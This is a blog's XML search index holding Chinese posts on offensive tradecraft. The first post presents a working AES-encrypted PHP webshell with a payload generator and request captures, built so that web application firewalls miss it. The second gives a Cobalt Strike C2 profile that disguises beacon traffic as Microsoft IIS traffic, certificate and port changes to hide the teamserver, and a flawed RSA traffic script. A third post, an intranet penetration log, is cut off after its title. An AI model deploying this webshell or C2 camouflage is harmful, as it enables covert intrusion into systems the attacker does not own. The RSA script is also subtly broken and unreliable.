<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>动态二进制加密一句话木马</title>
      <link href="2023/03/22/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>2023/03/22/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>我们常用的一句话木马客户端在向服务器发送Payload时就会被拦截，这也就导致了有些场景下会出现一句话虽然已经成功上传，但是却无法连接的情况。但如果使服务器所截获的流量使加密过的二进制流，这样就大大减小了被拦截的概率</p><a id="more"></a><h1 id="为何被拦截"><a href="#为何被拦截" class="headerlink" title="为何被拦截"></a>为何被拦截</h1><p>首先我们可以随便找一个payload，来分析一下其特征<br><img src="https://s2.loli.net/2023/03/22/EUotvynr4IDPcbQ.png"><br>可以看到虽然关键的代码采用了base64编码，但是payload中扔有多个明显的特征，比如有eval关键词，有Convert.FromBase64String，有三个参数，参数名为caidao（密码字段）、z1、z2，参数值有base64编码。针对这些特征很容易写出对应的防护规则，比如：POST请求中有Convert.FromBase64String关键字，有z1和z2参数，z1参数值为4个字符，z2参数值为base64编码字符。<br>这种大量的混淆，编码，可能会暂时的绕过防火墙，但防守方也能很轻易的解码，将其新的特征加入规则中。<br>为了解决这一问题， 我们尝试直接对传输的流量进行加密，对于不同的操作，采用不同的密钥进行加密，这样防守方就很难再去进行分析来提取出特征。<br>那我们的思路就比较明确了，主要的流程是</p><ol><li>客户端向服务器申请一个密钥</li><li>服务器随机生成密钥，并将其写入session，返回给客户端</li><li>客户端用服务器返回的密钥对payload进行加密，接着将加密后的payload发给服务器</li><li>服务器对收到的payload进行解密并执行，最后返回结果给客户端<h1 id="初步实现"><a href="#初步实现" class="headerlink" title="初步实现"></a>初步实现</h1>和Java和.NET不同，PHP并不存在手动编译的过程，开发人员只要提供PHP源代码，然后PHP会自己把源代码编译为opcode，由Zend引擎来解析opcode。因为不存在编译的中间环节，也就不存在已编译的二进制类文件。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<br>    <span class="hljs-variable">$decrptContent</span> = openssl_decrypt(<span class="hljs-variable">$result</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;Glacier__glacier&#x27;</span>);<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$decrptContent</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>    <span class="hljs-variable">$func</span>(<span class="hljs-variable">$params</span>); <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>整个过程主要分为两个部分，首先是GET类型请求，服务器随机生成一个密钥，将其写入session，同时返回给客户端<br>第二部分就是传输payload，服务端对其进行解密并执行<br>例如，客户端传入<code>assert|eval(&quot;phpinfo();&quot;)</code>，服务端再explode将其分割，最后执行<code>assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)</code><br>将其压缩一下，看着更像是一句话<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> session_start();<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])?<span class="hljs-keyword">print</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>):(<span class="hljs-variable">$b</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>], <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>])))&amp;<span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>接下来需要再本地生成一个payload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;836f3ab76289b6e2&quot;</span>;<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;assert|eval(&quot;phpinfo();&quot;)&#x27;</span>;<br>    <span class="hljs-variable">$encrpycontent</span>=openssl_encrypt(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;AES128&quot;</span>,<span class="hljs-variable">$key</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Glacier__glacier&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$encrpycontent</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>接着我们来试一下效果<br>在传上我们新型的码之后，先使用GET类型访问，获取服务端所生成的随机密钥<br><img src="https://s2.loli.net/2023/03/22/kGdYLZv8lUK2Jwh.png"><br>用该随机密钥在我们本地来加密payload<br><img src="https://s2.loli.net/2023/03/22/yNCrVDLQEXi92c6.png"><br>最后将加密后的payload使用post方法传输给服务端<br><img src="https://s2.loli.net/2023/03/22/nGECAo7M4aHgW5u.png"><br>成功执行</li></ol><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>接下来我们分析下服务端能看到的流量<br>首先是GET方式请求获取生成的随机密钥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> http://<span class="hljs-number">127.0.0.1</span>/test/exp.php?key=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;105&quot;</span>, <span class="hljs-string">&quot;Not)A;Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">105</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5195</span>.<span class="hljs-number">102</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=e<span class="hljs-number">1</span>jtekehablohs<span class="hljs-number">4</span>t<span class="hljs-number">8</span>b<span class="hljs-number">8</span>utft<span class="hljs-number">504</span><br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p>唯一可能会被列入规则的特征就是<code>key</code>，但这个参数可以将其改为与原网站已存在的GET请求相似的参数来对抗防守方<br>接下来看看POST传入的加密后的payload，跟GET类型一样，唯一可能会被列入规则的特征就是<code>payload</code>，我们也可以跟GET使用同样的方法来隐藏，或者使用<code>file_get_contents(&quot;php://input&quot;)</code>来获取传入php中的所有数据流来更好的隐藏特征</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> http://<span class="hljs-number">127.0.0.1</span>/test/exp.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;105&quot;</span>, <span class="hljs-string">&quot;Not)A;Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">105</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5195</span>.<span class="hljs-number">102</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=e<span class="hljs-number">1</span>jtekehablohs<span class="hljs-number">4</span>t<span class="hljs-number">8</span>b<span class="hljs-number">8</span>utft<span class="hljs-number">504</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">52</span><br><br><span class="hljs-attribute">payload</span>=INEgabMVaW<span class="hljs-number">1</span>BCNKmXy<span class="hljs-number">2</span>j<span class="hljs-number">0</span>F<span class="hljs-number">5</span>yrE/Q<span class="hljs-number">2</span>w<span class="hljs-number">2</span>IBCoVwnBOFPQ=<br></code></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="https://xz.aliyun.com/t/2744#toc-8">https://xz.aliyun.com/t/2744#toc-8</a><br><a href="https://xz.aliyun.com/t/2774">https://xz.aliyun.com/t/2774</a><br><a href="https://security.tencent.com/index.php/blog/msg/202">https://security.tencent.com/index.php/blog/msg/202</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike流量混淆与加密</title>
      <link href="2023/03/16/Cobaltstrike%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8A%A0%E5%AF%86/"/>
      <url>2023/03/16/Cobaltstrike%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>目标主机与server端的通信为HTTP协议，由此，当我们对cobalt strike的server端进行隐藏，伪造成一个正常的Web服务器，以此来伪装流量，最终达到通信隐匿的效果。cobalt strike通过提供Malleable-C2-Profiles来实现上述目的</p><a id="more"></a><h1 id="流量混淆、欺骗、加密"><a href="#流量混淆、欺骗、加密" class="headerlink" title="流量混淆、欺骗、加密"></a>流量混淆、欺骗、加密</h1><h2 id="Malleable-C2-Profiles构造"><a href="#Malleable-C2-Profiles构造" class="headerlink" title="Malleable-C2-Profiles构造"></a>Malleable-C2-Profiles构造</h2><p>Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。<br>使用方法：<code>./teamserver [external IP] [password] [/path/to/my.profile]</code><br>检查方法：<code>./c2lint [/path/to/my.profile]</code></p><p>这里直接放上我个人修改的profile</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs abnf">set sample_name <span class="hljs-string">&quot;Glacier Profile&quot;</span><span class="hljs-comment">;</span><br>set sleeptime  <span class="hljs-string">&quot;5000&quot;</span><span class="hljs-comment">; # use a ~30s delay between callbacks</span><br>set jitter <span class="hljs-string">&quot;0&quot;</span><span class="hljs-comment">;# throw in a 10% jitter;</span><br>set useragent <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span><span class="hljs-comment">;</span><br><br>https-certificate&#123;<br>set CN <span class="hljs-string">&quot;US&quot;</span><span class="hljs-comment">;</span><br>set O <span class="hljs-string">&quot;MicrosoftUpdates&quot;</span><span class="hljs-comment">;</span><br>set C <span class="hljs-string">&quot;en&quot;</span><span class="hljs-comment">;</span><br>set L <span class="hljs-string">&quot;en&quot;</span><span class="hljs-comment">;</span><br>set OU <span class="hljs-string">&quot;MicrosoftUpdates&quot;</span><span class="hljs-comment">;</span><br>set ST <span class="hljs-string">&quot;US&quot;</span><span class="hljs-comment">;</span><br>set validity <span class="hljs-string">&quot;365&quot;</span><span class="hljs-comment">;</span><br>set keystore <span class="hljs-string">&quot;glacier.store&quot;</span><span class="hljs-comment">;</span><br>set password <span class="hljs-string">&quot;glacier123&quot;</span><span class="hljs-comment">;</span><br>&#125;<br>http-get &#123;<br>    set uri <span class="hljs-string">&quot;/pixel.gif&quot;</span><span class="hljs-comment">;</span><br>    client &#123;<br>        header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;microsoft.com&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://www.baidu.com&quot;</span><span class="hljs-comment">;</span><br>header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;kepp-alive&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        metadata &#123;<br>            netbios<span class="hljs-comment">;</span><br>            prepend <span class="hljs-string">&quot;session-token=&quot;</span><span class="hljs-comment">;</span><br>            prepend <span class="hljs-string">&quot;skin=noskin;&quot;</span><span class="hljs-comment">;</span><br>            append <span class="hljs-string">&quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;</span><span class="hljs-comment">;</span><br>            header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br><br>    server &#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft-IIS/6.0&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span><span class="hljs-comment">;</span><br>        output &#123;<br>            netbios<span class="hljs-comment">;  # 加密方式（base64、base64url、netbios、netbiosu）</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>http-post &#123;<br>    set uri <span class="hljs-string">&quot;/email/&quot;</span><span class="hljs-comment">;</span><br>    client &#123;<br>        header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;microsoft.com&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://www.baidu.com&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span><span class="hljs-comment">;</span><br>header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;kepp-alive&quot;</span><span class="hljs-comment">; </span><br>        header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        id &#123;<br>            netbiosu<span class="hljs-comment">;</span><br>            append <span class="hljs-string">&quot;.png&quot;</span><span class="hljs-comment">;</span><br>            uri-append<span class="hljs-comment">;</span><br>        &#125;<br>        output &#123;<br>            netbios<span class="hljs-comment">;</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>    server &#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;img/jpg&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft-IIS/6.0&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span><span class="hljs-comment">;</span><br>        output &#123;<br>            netbios<span class="hljs-comment">;</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该文件的具体细节就不再过多描述了，很多博客或者官网都有相关介绍<br>接着我们可以用CS自带的c2lint验证一下其正确性(这里我在使用c2lint的时候一直报错，更换了多个版本的CS之后，认为应该是在破解CS时使得原先的解密功能出现问题)<br>我们使用c2lint主要是为了查看报错信息，验证其正确性，写好的profile在不同版本CS都是可以直接用的<br><img src="https://s2.loli.net/2023/03/16/Op92YAwGnsF1uEt.png" alt="get"><br><img src="https://s2.loli.net/2023/03/16/pws2EbxnJ9t1PIK.png" alt="post"><br>这里有几个细节，为了使我们伪造的流量更加真实，我构造了 <code>Host: microsoft.com</code>、<code>Cookie: skin=noskin;session-token=oojkadhmklofeajgobnlkakdnolejdflcsm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996</code>、<code>Server: Microsoft-IIS/6.0</code></p><h2 id="更换证书"><a href="#更换证书" class="headerlink" title="更换证书"></a>更换证书</h2><p>这里用到jdk自带的一个工具keytool，Keytool是一个Java数据证书的管理工具，将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。<br>我们这里用到的指令是<code>keytool -genkey -alias glacier -storepass glacier123 -keypass glacier123 -keyalg RSA -validity 36500 -keystore glacier.store</code><br>-alias 要处理的条目的别名 -storepass 密钥库口令 -keypass 密钥口令 -keyalg 密钥算法名称 -validity 有效天数 -keystore 密钥库名称<br>记住这里的store名称与口令<br>接着填写证书的相关信息<br><img src="https://s2.loli.net/2023/03/16/mzW7roATQyqXHKd.png"><br>最后修改teamsever，一般都是写在最后一行，将原先的cobalstrike.store更换为我们新生成的glacier.store,把对应的密钥库口令也改成我们新设置的口令<br><code>-Djavax.net.ssl.keyStore=./glacier.store -Djavax.net.ssl.keyStorePassword=glacier123</code><br>为了避免CS那显眼的50050端口，我们也可以把它改一下，改成2200<br>使用<code>keytool -list -v -keystore glacier.store </code>查看一下我们证书的信息，再启动teamsever，对比其是否一致<br><img src="https://s2.loli.net/2023/03/16/7NEGoVR5ZgvasY2.png"><br>启动teamsever，客户端能成功连上</p><h2 id="流量加密"><a href="#流量加密" class="headerlink" title="流量加密"></a>流量加密</h2><p>Cobalt Strike支持自定义的加密和混淆脚本，我们可以写个简单的脚本来对流量进行加密，以此来隐藏其流量特征</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><br>    key = RSA.generate(<span class="hljs-number">2048</span>) <span class="hljs-comment"># 生成一个 RSA 密钥对</span><br>    cipher = PKCS1_OAEP.new(key.publickey()) <span class="hljs-comment"># 创建 PKCS1_OAEP 加密对象</span><br>    key_str = key.export_key().decode() <span class="hljs-comment"># 导出公钥字符串</span><br>    encrypted_key = cipher.encrypt(<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1000000</span>)).encode()) <span class="hljs-comment"># 用公钥加密随机密钥</span><br>    encrypted_data = base64.b64encode(cipher.encrypt(data.encode())).decode() <span class="hljs-comment"># 用公钥加密数据并进行 Base64 编码</span><br>    <span class="hljs-keyword">return</span> key_str, base64.b64encode(encrypted_key).decode(), encrypted_data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">key_str, encrypted_key, encrypted_data</span>):</span><br>    key = RSA.import_key(key_str.encode()) <span class="hljs-comment"># 导入私钥</span><br>    cipher = PKCS1_OAEP.new(key) <span class="hljs-comment"># 创建 PKCS1_OAEP 解密对象</span><br>    decrypted_key = <span class="hljs-built_in">int</span>(cipher.decrypt(base64.b64decode(encrypted_key))) <span class="hljs-comment"># 用私钥解密随机密钥</span><br>    decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data)).decode() <span class="hljs-comment"># 用私钥解密数据并进行 Base64 解码</span><br>    <span class="hljs-keyword">return</span> decrypted_data<br></code></pre></td></tr></table></figure><p>这里用到的是RSA算法，将数据和一个随机的密钥进行加密<br>将该脚本上传到server端，可以在Beacon 的配置文件中指定该脚本的路径，并将 post-execute 选项设置为 exec，以便在 Beacon 连接到 C2 服务器时自动执行该脚本。</p><hr><p>参考文章：<br><a href="https://www.freebuf.com/news/189948.html">https://www.freebuf.com/news/189948.html</a><br><a href="https://blog.csdn.net/m0_50526465/article/details/116465013#comments_18814516">https://blog.csdn.net/m0_50526465/article/details/116465013#comments_18814516</a><br><a href="https://wxiaoge.blog.csdn.net/article/details/126128872?spm=1001.2014.3001.5502">https://wxiaoge.blog.csdn.net/article/details/126128872?spm=1001.2014.3001.5502</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透记录1</title>
      <link href="2023/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%951/"/>
      <url>2023/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%951/</url>
      
